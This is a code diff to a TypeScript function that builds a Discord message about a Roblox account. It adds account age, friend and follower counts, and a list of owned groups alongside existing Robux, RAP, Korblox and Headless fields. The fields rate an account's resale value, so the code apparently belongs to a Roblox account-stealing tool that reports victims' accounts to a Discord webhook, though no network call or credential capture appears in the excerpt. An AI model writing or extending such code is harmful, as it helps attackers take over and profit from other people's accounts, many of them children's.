@@ -323,14 +323,53 @@ function buildDiscordPayload(opts: {
   }
 
   if (roblox) {
+    const ageStr = roblox.accountAgeDays !== null && roblox.createdAt
+      ? `${roblox.accountAgeDays.toLocaleString()} days (${new Date(roblox.createdAt).toISOString().slice(0, 10)})`
+      : "Unknown";
+
     mainFields.push(
       { name: "Roblox Username", value: `${roblox.name} (${roblox.displayName})`, inline: true },
       { name: "User ID", value: String(roblox.id), inline: true },
+      { name: "Account Age", value: ageStr, inline: true },
       { name: "Robux", value: roblox.robux !== null ? roblox.robux.toLocaleString() : "Unknown", inline: true },
       { name: "RAP", value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
       { name: "Premium", value: roblox.premium === null ? "Unknown" : roblox.premium ? "Yes" : "No", inline: true },
+      { name: "Friends", value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: "Followers", value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: "Following", value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
       { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
+      { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
+    );
+
+    // Owned groups — chunked to 1024 chars per field
+    if (roblox.ownedGroups.length > 0) {
+      const lines = roblox.ownedGroups.map(
+        (g) => `• **${g.name}** — ${g.memberCount.toLocaleString()} members`
+      );
+      const chunks: string[] = [];
+      let buf = "";
+      for (const line of lines) {
+        if ((buf + "\n" + line).length > 1024) {
+          chunks.push(buf);
+          buf = line;
+        } else {
+          buf = buf ? `${buf}\n${line}` : line;
+        }
+      }
+      if (buf) chunks.push(buf);
+      chunks.forEach((c, i) => {
+        mainFields.push({
+          name: chunks.length === 1 ? `👑 Owned Groups (${roblox.ownedGroups.length})` : `👑 Owned Groups (${i + 1}/${chunks.length})`,
+          value: c,
+          inline: false,
+        });
+      });
+    } else {
+      mainFields.push({ name: "👑 Owned Groups", value: "None", inline: false });
+    }
+
+    mainFields.push(
       { name: "Profile", value: `https://www.roblox.com/users/${roblox.id}/profile`, inline: false },
     );
   } else {
